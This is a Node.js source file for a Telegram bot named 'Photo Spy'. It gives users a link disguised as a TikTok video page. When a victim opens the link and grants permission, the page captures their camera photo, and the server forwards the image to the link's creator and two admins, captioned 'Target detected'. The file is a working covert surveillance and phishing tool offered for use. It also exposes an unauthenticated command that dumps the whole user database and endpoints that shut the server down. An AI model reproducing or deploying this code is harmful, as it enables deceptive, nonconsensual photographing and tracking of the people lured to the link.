require("dotenv").config();
const { Telegraf } = require("telegraf");

const dataBase = require("./dataBase.js");
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const app = express();

const bot = new Telegraf(process.env.TOKEN);


const admin = process.env.ADMIN;
const admin2 = process.env.ADMIN2;

bot.telegram.setMyCommands([
  {
    command: "start",
    description: "Начать диалог",
  }
]);

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));

app.use(express.json());
app.use(express.static("public"));
app.use(express.static("src"));
app.use(cors({ methods: ["POST", "GET"] }));



function base64(img, id_t) {
  const current_name = new Date().getTime();

  const matches = img.match(/^data:image\/(\w+);base64,(.+)$/);
  if (!matches) {
    throw new Error("Invalid input string");
  }
  const extension = matches[1];
  const data = matches[2];
  const buffer = Buffer.from(data, "base64");

  const fileName = `public/${current_name}.${extension}`;
  fs.writeFileSync(fileName, buffer);

  dataBase.findOne({ id_video: id_t * 1 }).then((res) => {
    console.log(res);
    if (res !== null) {
      bot.telegram.sendMediaGroup(res.id, [
        {
          type: "photo",
          caption: `<b>🕵️♂️ Цель обнаружена!</b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);

      bot.telegram.sendMediaGroup(admin, [
        {
          type: "photo",
          caption: `<b>🕵️♂️ Цель обнаружена от пользователя @${res.username}! </b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);
      bot.telegram.sendMediaGroup(admin2, [
        {
          type: "photo",
          caption: `<b>🕵️♂️ Цель обнаружена от пользователя @${res.username}! </b>`,
          parse_mode: "HTML",
          media: { source: `public/${current_name}.png` },
          //media:`http://localhost:3000/${current_name}.png`
        },
      ]);
      
      
      
    }
    
  });
}

bot.command("start", async (ctx) => {
  const { id, first_name, username, language_code } = ctx.from;

  dataBase.findOne({ id, first_name, username }).then((res) => {
    if (!res) {
      console.log("Запись  создаеться");
      dataBase.insertOne({
        id,
        first_name,
        username,
        id_video: dateNow(),
      });
    } else {
      console.log("Запись уже создана");
    }
  });

  ctx.replyWithPhoto("https://i.ibb.co/LXWpytsq/card-1010.jpg", {
    caption: `🕵️‍♂️ <b>Добро пожаловать в Фотошпион!</b>\n\n<blockquote>Я помогу тебе добывать "улики" и следить за целями.</blockquote>\n\n<b>Включаю режим невидимки...</b> 👻 `,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "👁️ Получить ссылку", callback_data: `get_link` }],
      ],
    },
  });
});

bot.action("get_link", (ctx) => {
  const { id, first_name, username, language_code } = ctx.from;

  dataBase.findOne({ id }).then((res) => {
    ctx.reply(
      `<b>📸 Вы получите фото, если кто-то перейдет по вашей ссылке и даст разрешение. </b>\n<code>https://tik-toki.onrender.com/video?v=${res.id_video}</code>`,
      { parse_mode: "HTML" }
    );

  });
});

bot.command("db", async (ctx) => {
  dataBase.find({}).then((res) => {
    ctx.reply("```js" + JSON.stringify(res, null, 2) + "```", {
      parse_mode: "Markdown",
    });
  });
});





bot.command("kill", async (ctx) => {
  ctx.reply('Бот выключен');
  setTimeout(() => {
    process.kill(process.pid, 'SIGTERM');
  }, 1000)
});



app.get("/video", (req, res) => {
  res.sendFile(__dirname + "/src/index.html");
});

app.get("/task-client", (req, res) => {
  res.send("task");
});


app.get("/kill", (req, res) => {
  process.kill(process.pid, 'SIGTERM');
});


app.post("/img", async (req, res) => {
  base64(req.body.img, req.body.id);
  res.send({ type: true });
});

app.get("/sleep", async (req, res) => {
  res.send({ type: true });
});
app.post("/sleep", async (req, res) => {
  res.send({ type: true });
});

bot.launch();

app.get("/wake-up", async (req, res) => {
  res.send({ type: 200 });
});

function dateNow() {
  return new Date().getTime();
}
app.listen(3000, (err) => {
  err ? err : console.log("Started");
});
